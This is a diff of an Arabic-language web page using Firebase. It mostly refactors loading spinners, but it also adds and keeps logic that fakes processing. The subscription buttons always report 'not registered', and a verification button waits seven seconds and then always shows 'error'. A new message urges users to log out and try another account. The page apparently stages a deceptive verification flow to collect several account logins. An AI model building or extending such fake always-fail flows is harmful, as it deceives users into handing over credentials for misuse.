@@ -68,18 +68,16 @@
       cursor: not-allowed;
       position: relative;
     }
-    .loading::after {
-      content: "";
-      width: 20px;
-      height: 20px;
-      border: 3px solid white;
-      border-top: 3px solid transparent;
+    /* Spinner الخاص بأزرار يومي/شهري */
+    .spinner {
+      border: 2px solid #fff;
+      border-top: 2px solid transparent;
       border-radius: 50%;
-      position: absolute;
-      right: 10px;
-      top: 50%;
-      transform: translateY(-50%);
+      display: inline-block;
+      width: 16px;
+      height: 16px;
       animation: spin 1s linear infinite;
+      vertical-align: middle;
     }
     @keyframes spin {
       from { transform: rotate(0deg); }
@@ -134,16 +132,20 @@
       border: none;
       border-radius: 5px;
     }
-    /* تنسيق الـ spinner داخل الزر */
-    .spinner {
+    /* Spinner الخاص بزر التحقق */
+    .verify-spinner {
       border: 2px solid #fff;
       border-top: 2px solid transparent;
       border-radius: 50%;
       display: inline-block;
       width: 16px;
       height: 16px;
-      animation: spin 1s linear infinite;
+      animation: spin-verify 1s linear infinite;
       vertical-align: middle;
+    }
+    @keyframes spin-verify {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
     }
   </style>
   <!-- Firebase SDK -->
@@ -202,9 +204,21 @@
       });
     }
 
-    function showLoadingAndFail(button) {
+    // دالة الـ spinner الخاصة بزر يومي/شهري (مستخدمة في showLoadingAndFail)
+    function showButtonSpinner(button) {
       button.classList.add("loading");
       button.textContent = "جارٍ المعالجة...";
+    }
+
+    // دالة الـ spinner الخاصة بزر التحقق
+    function showVerifySpinner(verifyButton) {
+      verifyButton.disabled = true;
+      verifyButton.innerHTML = '<span class="verify-spinner"></span>';
+    }
+
+    function showLoadingAndFail(button) {
+      // استخدام spinner منفصل لزر يومي/شهري
+      showButtonSpinner(button);
       setTimeout(() => {
         button.classList.remove("loading");
         button.textContent = "لم يتم التسجيل";
@@ -223,16 +237,16 @@
         // إضافة مستمع للنقر على زر "تحقق"
         const verifyButton = document.getElementById("verifyButton");
         verifyButton.addEventListener("click", function() {
-          // تعطيل الزر وعرض أيقونة تحميل داخل الزر
-          verifyButton.disabled = true;
-          verifyButton.innerHTML = '<span class="spinner"></span>';
+          // استخدام spinner خاص بزر التحقق
+          showVerifySpinner(verifyButton);
           // بعد 7 ثوانٍ، تغيير محتوى الزر إلى "خطأ" وتغيير لونه إلى الأحمر
           setTimeout(() => {
             verifyButton.disabled = false;
             verifyButton.textContent = "خطأ";
             verifyButton.style.backgroundColor = "red";
-            // لا يتم إخفاء الرسالة، بل تبقى مرئية
-            // وبعد 3 ثوانٍ، إعادة النص إلى "تحقق" ولونه الأزرق
+            // كتابة الرسالة أسفل حقل الإدخال وزر التحقق
+            document.getElementById("errorMessageBelow").textContent = "اذا لم يصل الرمز في غضون 3 دقائق الرجاء المحاولة بحساب اخر والتاكد من تسجيل الخروج من الحساب الحالي لعدم تصنيفك كمتلاعب";
+            // وبعد 3 ثوانٍ، إعادة النص إلى "تحقق" ولونه الأزرق مع بقاء الرسالة ظاهرة
             setTimeout(() => {
               verifyButton.textContent = "تحقق";
               verifyButton.style.backgroundColor = "#007bff";
@@ -326,4 +340,4 @@
     <button id="retryButton" class="retry-btn" style="display: none;">إعادة المحاولة بحساب جديد</button>
   </div>
 </body>
-  </html>
+</html>
